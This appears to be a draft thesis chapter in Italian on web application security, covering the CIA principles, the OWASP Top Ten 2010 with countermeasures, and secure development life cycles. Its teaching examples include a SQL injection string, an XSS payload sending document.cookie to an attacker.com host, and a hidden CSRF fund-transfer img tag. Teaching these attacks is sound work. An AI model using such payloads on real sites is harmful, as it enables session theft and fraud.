\chapter{Sicurezza di applicazioni web}

\begin{epigraphs}
\qitem{"If you think technology can solve your security problems, then you don't understand the problems and you don't understand the technology."}{---\textsc{ Bruce Schneier, 'Applied Cryptography' author}}
\end{epigraphs}

La diffusione globale di internet è un fenomeno in costante crescita, determinato dalle sempre più agevoli condizioni di accesso e coadiuvato dall'interesse per i servizi che la rete offre. \\
Le applicazioni web sono parte fondamentale di questo processo, la loro evoluzione nel corso degli anni è stata un fattore determinante per la crescita della rete. Servizi sempre più complessi hanno favorito l'interazione con gli utenti e la crescita di nuove opportunità di business. Ciò ha catturato l'interesse di individui malintenzionati, per tale motivo è nata l'esigenza di meccanismi che potessero garantire la sicurezza dei dati.

Creare sistemi sicuri comporta la soluzione di numerosi e complessi problemi: dallo sviluppo di un'architettura sicura alla creazione di robusti sistemi crittografici fino alla definizione di policy di sicurezza. Nonostante l'esistenza di queste problematiche, grossa parte degli attacchi alla security di un'applicazione sono rivolti all'errata implementazione del software oppure a vulnerabilità create dalla negligenza dello sviluppatore.
Nel corso degli anni il problema della sicurezza dei dati ha assunto dimensioni rilevanti tanto che sono state proposte soluzioni per integrare la security nel processo di sviluppo software.

\section{Fondamenti di sicurezza}
La sicurezza nel software è basata sui principi di \emph{confidentiality}, \emph{integrity} ed \emph{availability}, solitamente caratterizzata dell'acronimo \emph{CIA}.\\
\begin{itemize}
\item Confidentiality: indica la misura che vieta la diffusione di informazioni a soggetti o sistemi non autorizzati. E' condizione necessaria (ma non sufficiente) per garantire la privacy.
\item Integrity: indica la certezza che un dato non venga modificato in modo imprevisto da chi non ne possiede l'autorizzazione.
\item Availability: indica la disponibilità del dato per chi ne ha l'autorizzazione quando richiesto.
\end{itemize}
Negli ultimi anni tuttavia è stata messa in discussione la definizione di sicurezza attraverso questi tre termini, con la proposta di termini aggiuntivi. Ad esempio nel 2002 Donn Parker\cite{CITAZIONE} propose un'alternativa composta da sei termini, aggiungendo ai tre classici principi le nozioni di possession, authenticity e utility.
Possession indica la proprietà dei diritti di controllo dei dati, authenticity indica la capacità di accertare la validità del dato, utility indica la capacità di un dato di essere utile per un determinato scopo.

\section{Vulnerabilità nelle applicazioni web}
Le vulnerabilità sono presenti nel software per vari motivi: per errate decisioni architetturali ed implementative, per mancata conoscenza da parte dello sviluppatore delle problematiche di security e per negligenza. Queste ultime due motivazioni sono ancora più veritiere nel mondo degli applicativi web: linguaggi come PHP non hanno una curva di apprendimento ripida e consentono a chiunque di realizzare applicazioni web.\\
Molti sviluppatori non conoscono o non si rendono conto delle problematiche di security a cui vanno incontro se vengono inseriti dati malevoli nelle loro applicazioni. E' un problema principalmente di educazione, i vari libri di programmazione difficilmente si soffermano sull'importanza di scrivere codice sicuro. Allo stesso modo il lavoro di sviluppatore non sempre richiede determinate certificazioni per essere praticato.\\
Un'altra motivazione che esclude la sicurezza dal processo di sviluppo software è costituita dalle condizioni economiche, le quali possono incidere sulle tempistiche e quindi restringere il tempo da dedicare al testing ed al controllo del codice. Solitamente infatti raggiungere una release stabile del progetto è la massima priorità, mentre la sicurezza non lo è.\\

Il controllo qualità nei progetti software è altamente focalizzato sull'adesione ai requisiti imposti in fase di progettazione, molto meno sulle implicazioni che può avere una errata implementazione delle specifiche. Solitamente anche in presenza di vulnerabilità non si violano le specifiche imposte dai requisiti.\\
Tecnicamente, al fine di rendere un software sicuro, tutte le parti di quel software devono essere sicure, non solo le parti sensibili dal punto di vista della sicurezza. E' proprio in questo codice che statisticamente si concentrano le vulnerabilità, quelle in cui la sicurezza non è un requisito. \\
Un esempio di tale situazione è la procedura di acquisto prodotti su un e-commerce: non è necessario che solo la parte di acquisto tramite carta di credito sia sicura, un attaccante può sfruttare una vulnerabilità in qualunque punto dell'applicazione per accedere ai dati delle carte di credito degli utenti.

OWASP (Open Web Application Security Project) è un gruppo composto da volontari che produce tools, standard e documentazione open-source gratuita inerente la web security. 
Gli obiettivi di OWASP sono i seguenti:\begin{itemize}
\item Diffondere la cultura dello sviluppo di applicativi web sicuri.
\item Contribuire alla sensibilizzazione sia dei professionisti che delle aziende verso le problematiche di Web Security, attraverso la circolazione di idee, articoli, best- practice e tool.
\item Promuovere l’uso di metodologie e tecnologie che consentano di migliorare il livello di sicurezza delle applicazioni web.
\end{itemize}
OWASP Top Ten è un progetto, rilasciato da OWASP con cadenza triennale, che raccoglie 10 tipologie di vulnerabilità tipiche delle applicazioni web. E' una classificazione accettata a livello globale basata sul rischio, che fornisce anche le contromisure per mitigare l'eventuale problematica. Di seguito si riportano le prime cinque vulnerabilità citate dalla OWASP Top Ten 2010, utili in seguito nella trattazione.

\subsection{Injection}
Questa categoria di vulnerabilità raccoglie tutte le casistiche in cui dati non fidati vengono inviati ad un interprete come parte di un comando o di una query. Tali dati possono essere eseguiti dall'interprete e possono condurre all'esecuzione di comandi non voluti oppure all'accesso a dati non autorizzati. Fanno parte di questa categoria SQL injection, LDAP injection e OS injection.\\
E' molto comune trovare questa tipologia di vulnerabilità in codice legacy, ovvero non più supportato dal produttore, ed è una vulnerabilità che ha un severo impatto sull'applicazione poichè può portare alla corruzione del sistema, ad un \emph{denial of service} oppure alla perdita di dati.\\
Un esempio di tale vulnerabilità può essere il seguente:
\begin{lstlisting}[language=SQL]
$query = "SELECT * FROM accounts WHERE custID ='" . $_GET["id"] ."'";
mysql_query($query);
\end{lstlisting}

L'applicazione esegue la query sul database MySql sottostante, utilizzando come parametro un valore preso direttamente dall'URL. Tale query espone però l'applicazione ad un possibile attacco di tipo SQL Injection. Infatti inserendo nell'URL una stringa come la seguente

\begin{lstlisting}[language=SQL]
http://example.com/app/accountView?id=' or '1'='1
\end{lstlisting}

la query viene interpretata in modo diverso, ritornando tutti i record di quella tabella dal database. Nel caso peggiore un attaccante può utilizzare questa vulnerabilità per eseguire query che alterano i dati nel database, riuscendo ad ottenere il completo controllo. \\
Per evitare di incorrere in questa tipologia di vulnerabilità è opportuno utilizzare un API per il dialogo con il database, che si occupa di filtrare i parametri in ingresso alle query. Una soluzione alternativa può essere quella di effettuare l'escape dei caratteri speciali usando specifiche sintassi per ogni interprete.

\subsection{Cross site scripting}
Vulnerabilità di tipo Cross site scripting (denominate spesso con l'acronimo XSS, da non confondere con CSS di cascading style sheets) si verificano quando un'applicazione riceve dati di input non fidati e li invia ad un browser senza un'appropriata validazione o escaping. \\
XSS consente ad un attaccante di eseguire scripts sul browser della vittima, i quali possono effettuare l'hijacking della sessione utente, possono recuperare cookie di sessione, possono redirezionare l'utente su siti web malevoli o possono effettuare defacing del sito web. \\
Un esempio di cross site scripting può essere il seguente: 

\begin{lstlisting}[language=PHP]
$page += "<input name='creditcard' type="text" value='" + $_GET["CC"] + "'>";
\end{lstlisting}

Supponendo di avere una pagina che mostra a video il numero di carta di credito di un individuo, ottenuto attraverso i parametri in input dall'URL, l'attaccante potrà semplicemente costruire un URL con un valore del parametro CC modificato e fare in modo che l'utente visiti tale URL per effettuare l'hijacking della sessione utente, come nell'esempio seguente:

\begin{lstlisting}[language=PHP]
'><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.
\end{lstlisting}

Esistono tre tipologie di cross site scripting:
\begin{itemize}
\item Stored: Il codice viene iniettato nel server in modo permanente, in un database, in un forum, in un commento, ecc. La vittima ottiene lo script malevolo ad ogni visita della pagina.
\item Reflected: Il codice malevolo non viene iniettato nel server ma viene inviato alla vittima attraverso mezzi alternativi, come un email contenente un link. Quando l'utente viene convinto a cliccare su tale link il codice viene eseguito.
\item DOM based: Un payload malevolo viene eseguito come risultato della modifica del DOM\footnote{Document Object Model} del browser dell'utente. La risposta HTTP in questo caso non cambia ma il codice contenuto nella pagina viene eseguito in modo diverso a causa delle modifiche effettuate al DOM.\\
E' diverso da stored e reflected XSS poichè in questo caso il payload melevolo non è nella pagina di risposta del server ad una richiesta.
\end{itemize}

Vulnerabilità di tipo XSS hanno impatto significativo sull'utente, meno significativo sull'applicazione (ad eccezione del caso stored, in cui l'applicazione è direttamente coinvolta).\\
Prevenire vulnerabilità di tipo XSS comporta la separazione tra dati non fidati ed il contenuto attivo del browser. E' quindi necessario effettuare l'escape dei contenuti in input basati su codice HTML, a seconda del contesto in cui tali dati verranno poi utilizzati.

\subsection{Broken authentication and session management}
Funzionalità come l'autenticazione e la gestione delle sessioni utente sono spesso implementate non correttamente, consentendo all'attaccante di ottenere passwords, chiavi, tokens di sessione o di impersonificare altri utenti.\\
Il classico esempio di questa vulnerabilità si verifica quando il timeout della sessione utente non è settato correttamente. Supponendo che l'utente sia loggato nell'applicazione attraverso un browser su un computer e al termine dell'uso si dimentichi di cliccare su logout. Un attaccante potrebbe collegarsi al sito attraverso lo stesso computer e ritrovarsi già loggato nell'applicazione, con il profilo del vecchio utente. \\
Questa tipologia di vulnerabilità ha radici architetturali oltre che implementative, per tale motivo le contromisure consistono nel seguire raccomandazioni e specifiche per il management delle sessioni e dell'autenticazione utente.

\subsection{Insecure direct object references}
Una direct object reference si verifica quando uno sviluppatore espone un collegamento ad un oggetto interno, come un file, una directory, ad una chiave per accedere al database, ecc. Senza le opportune protezioni gli attaccanti possono manipolare tali collegamenti per accedere a dati in modo non autorizzato.\\
Un esempio di tale vulnerabilità può verificarsi nelle applicazioni di home banking, dove il numero di conto corrisponde alla chiave primaria nel database. Anche se gli sviluppatori hanno utilizzato query SQL che evitano injections, se non esistono controlli aggiuntivi per verificare che l'utente sia il proprietario dell'account e sia autorizzato a visualizzare determinati contenuti, un attaccante potrebbe sfruttare il numero di conto per visualizzare dati provenienti da conti altrui.\\
Le contromisure consistono nella verifica continua che l'accesso ai dati esposti avvenga effettivamente dagli utenti autorizzati e nell'uso di referenze ad oggetti interni indirette, quali ad esempio indici non collegati a dati sensibili. 

\subsection{Cross site request forgery}
Un attacco di tipo cross site request forgery (CSRF) forza una vittima loggata nell'applicazione web ad eseguire richieste HTTP costruite dall'attaccante per uno scopo ben preciso (tramite tags di tipo immagine, XSS o altre tecniche), generalmente ad insaputa della vittima. L'applicazione a questo punto reagisce interpretando la richiesta come legittima, e la richiesta può accedere ad ogni dato a cui la vittima può accedere.\\
Si riporta un esempio di tale problematica:

\begin{lstlisting}[language=PHP]
http://example.com/app/transferFunds?amount=1500&destinationAccount=4673243243
\end{lstlisting}

L'applicazione di home banking esegue un trasferimento fondi da un account ad un altro mediante l'uso dei parametri riportati. In questo caso non vi è nulla di segreto nella richiesta. Se l'attaccante fosse in grado di lanciare sul computer della vittima loggata al sito una richiesta di questo tipo, con il proprio numero di conto nel campo destinationAccount, potrebbe trasferire la cifra riportata a se stesso. Per fare ciò, potrebbe forgiare un tag di tipo img apposito e fare in modo che la vittima lo visualizzi da loggata.\\
L'esempio sottostante mostra un tag img adatto allo scopo:

\begin{lstlisting}[language=PHP]
<img src="http://example.com/app/transferFunds?amount=1500&destinationAccount=attackersAcct#" width="0" height="0" />
\end{lstlisting}

Prevenire CSRF comporta la creazione di un token non prevedibile nel corpo o nell'URL di ogni richiesta HTTP. Tale token dovrebbe essere univoco per sessione utente, ma è ancora meglio se è univoco per ogni richiesta. Con la presenza di tale valore non è più possibile per l'attaccante la creazione di una richiesta valida da fare eseguire di nascosto alla vittima.

\subsection{Altre vulnerabilità}
Le altre vulnerabilità citate in OWASP Top Ten ma non riportate nella sezioni precedenti sono le seguenti:

\begin{itemize}
\item Security misconfiguration: Le applicazioni web si basano su uno stack, ovvero un insieme di programmi che lavorano a diversi livelli. Molti di essi devono essere configurati correttamente, poiché non tutti vengono forniti di default con un setup sicuro, devono essere inoltre mantenuti ed aggiornati. Questa tipologia di vulnerabilità include tutti i casi in cui tale software non viene configurato o mantenuto correttamente.
\item Insecure cryptographic storage: Molte applicazioni web non proteggono attraverso l'uso di cifratura i dati sensibili, come numeri di carte di credito o credenziali di autenticazione. Gli attaccanti possono quindi rubare o modificare tali dati per eseguire furti di identità, frodi ed altri crimini.
\item Failure to restrict URL access: E' comune per un'applicazione web controllare i permessi di accesso all'URL prima di visualizzare contenuti protetti. Tuttavia le applicazioni necessitano che questi controlli vengano eseguiti ogni volta che queste pagine vengono accedute o gli attaccanti saranno in grado di costruire URL appositi per accedere a tali risorse senza i permessi.
\item Insufficient transport layer protection: Le applicazioni spesso falliscono nel proteggere la confidenzialità e l'integrità del traffico di rete. Questo poiché talvolta utilizzano algoritmi non corretti, certificati non validi o scaduti, non implementano SSL oppure falliscono l'implementazione delle best practice per questa problematica.
\item Unvalidated redirects and forwards: Può capitare che un'applicazione redirezioni l'utente verso altre pagine o siti web, usando dati non sicuri per determinare le pagine di destinazione. Senza l'appropriata validazione un attaccante può redirezionare la vittima verso phishing o siti contenenti malware.
\end{itemize} 

\section{Security development life cycle}
Tutte le realtà che si occupano di sviluppo software implementano un modello che definisce le fasi entro cui lo sviluppo prende parte. Tali fasi sono definite nel software development life cycle (SDLC).\\
Esistono diversi modelli che implementano il software development life cycle:
\begin{itemize}
\item A cascata
\item A spirale
\item Iterativo ed incrementale
\item Agile
\item Code and fix
\end{itemize}
Tutti questi modelli però non contemplano la fase di analisi della sicurezza dell'applicazione, bensì relegano tale fase al termine del processo di sviluppo. Ciò è inefficiente poiché influisce sui costi (una modifica a prodotto completato è sicuramente più costosa di una modifica eseguita durante lo sviluppo) e comporta una perdita di controllo (modificare il prodotto in uno stage così avanzato del processo comporta dover eseguire nuovamente i test). Per tali motivi è opportuno che l'analisi di sicurezza venga implementata nello sviluppo, introducendo un diverso software development life cycle.

INSERIRE QUI IMMAGINE SDLC

L'immagine \ref{} mostra come la sicurezza non sia una fase all'interno del processo di sviluppo, bensì un processo, da attuare costantemente.\\
E' fondamentale identificare il prima possibile un problema di sicurezza, poiché ciò comporta costi minori di fixing e riduce la finestra di esposizione, presente nel modello patch-and-penetrate  \ref{}, dominante fino a pochi anni fa. 
Introdurre l'analisi di sicurezza nel SDLC non è però semplice, occorre una maggiore conoscenza delle problematiche e qualche sistema in grado di automatizzare la ricerca di errori comuni, che abbia come requisito una rapidità di scansione e feedbacks immediati. Per questo compito l'analisi statica è altamente efficiente.